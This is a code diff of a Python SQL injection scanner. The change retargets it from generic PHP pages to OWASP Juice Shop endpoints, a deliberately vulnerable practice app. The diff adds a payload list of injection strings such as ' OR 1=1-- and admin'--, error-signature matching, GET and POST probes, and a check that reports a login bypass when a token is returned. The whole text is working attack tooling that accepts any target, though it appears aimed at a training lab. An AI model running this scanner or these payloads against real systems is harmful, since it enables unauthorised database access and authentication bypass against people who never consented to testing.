@@ -3,13 +3,18 @@ import urllib3
 urllib3.disable_warnings()
 
 SQLI_PAYLOADS = [
-    "'", "''", "`", "``", ",", "\"", "\"\"",
-    "/", "//", "\\", "//", ";",
-    "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--",
-    "\" OR \"1\"=\"1", "\" OR 1=1--",
-    "' AND 1=1--", "' AND 1=2--",
-    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
-    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+    "'",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR '1'='1' --",
+    "\" OR \"1\"=\"1",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 2--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "admin'--",
+    "' AND 1=1--",
+    "' AND 1=2--",
 ]
 
 ERROR_SIGNATURES = [
@@ -19,62 +24,76 @@ ERROR_SIGNATURES = [
     "quoted string not properly terminated",
     "sql syntax",
     "mysql_fetch",
-    "mysqli_fetch",
-    "pg_exec",
     "sqlite_",
-    "odbc_exec",
     "ora-",
-    "microsoft ole db provider for sql server",
     "syntax error",
+    "sequelize",
+    "sqlite",
+    "SQLITE_ERROR",
+    "near \"'\"",
+    "unrecognized token",
 ]
+
+JUICE_SHOP_ENDPOINTS = [
+    "/rest/products/search?q=",
+    "/rest/user/login",
+    "/api/Products?q=",
+]
+
+def test_get(base_url, endpoint, payload):
+    url = f"{base_url}{endpoint}{requests.utils.quote(payload)}"
+    try:
+        r = requests.get(url, timeout=5, verify=False)
+        body = r.text.lower()
+        for sig in ERROR_SIGNATURES:
+            if sig.lower() in body:
+                return {"url": url, "payload": payload, "signature": sig, "method": "GET"}
+    except:
+        pass
+    return None
+
+def test_post(base_url, endpoint, payload):
+    url = f"{base_url}{endpoint}"
+    data = {"email": payload, "password": payload}
+    try:
+        r = requests.post(url, json=data, timeout=5, verify=False)
+        body = r.text.lower()
+        for sig in ERROR_SIGNATURES:
+            if sig.lower() in body:
+                return {"url": url, "payload": payload, "signature": sig, "method": "POST"}
+        # Juice Shop login bypass check
+        if r.status_code == 200 and "token" in r.text:
+            return {"url": url, "payload": payload, "signature": "Auth bypass - token returned", "method": "POST"}
+    except:
+        pass
+    return None
 
 def run(target):
     if not target.startswith("http"):
         target = "http://" + target
 
+    target = target.rstrip("/")
+
     print(f"    [*] Target: {target}")
-    print(f"    [*] Testing {len(SQLI_PAYLOADS)} SQLi payloads...\n")
+    print(f"    [*] Testing {len(SQLI_PAYLOADS)} payloads on {len(JUICE_SHOP_ENDPOINTS)} endpoints...\n")
 
     found = []
-    tested = 0
 
-    # Test URL parameters
-    test_urls = [
-        f"{target}/index.php?id=1",
-        f"{target}/item.php?id=1",
-        f"{target}/product.php?id=1",
-        f"{target}/view.php?id=1",
-        f"{target}/page.php?id=1",
-    ]
-
-    for url in test_urls:
-        base_url = url.split("?")[0]
-        param = url.split("?")[1]
-
+    for endpoint in JUICE_SHOP_ENDPOINTS:
         for payload in SQLI_PAYLOADS:
-            test_url = f"{base_url}?{param}{payload}"
-            try:
-                r = requests.get(test_url, timeout=5, verify=False)
-                body = r.text.lower()
-                tested += 1
+            if "login" in endpoint:
+                result = test_post(target, endpoint, payload)
+            else:
+                result = test_get(target, endpoint, payload)
 
-                for sig in ERROR_SIGNATURES:
-                    if sig in body:
-                        result = {
-                            "url": test_url,
-                            "payload": payload,
-                            "signature": sig
-                        }
-                        print(f"    \033[92m[+] SQLi Found!\033[0m")
-                        print(f"        URL: {test_url}")
-                        print(f"        Payload: {payload}")
-                        print(f"        Signature: {sig}\n")
-                        found.append(result)
-                        break
-            except:
-                pass
+            if result:
+                print(f"    \033[92m[+] SQLi Found!\033[0m")
+                print(f"        Method: {result['method']}")
+                print(f"        URL: {result['url']}")
+                print(f"        Payload: {result['payload']}")
+                print(f"        Signature: {result['signature']}\n")
+                found.append(result)
 
-    print(f"    [*] Tested {tested} requests")
     if not found:
         print("    [-] No SQLi vulnerabilities detected")
 
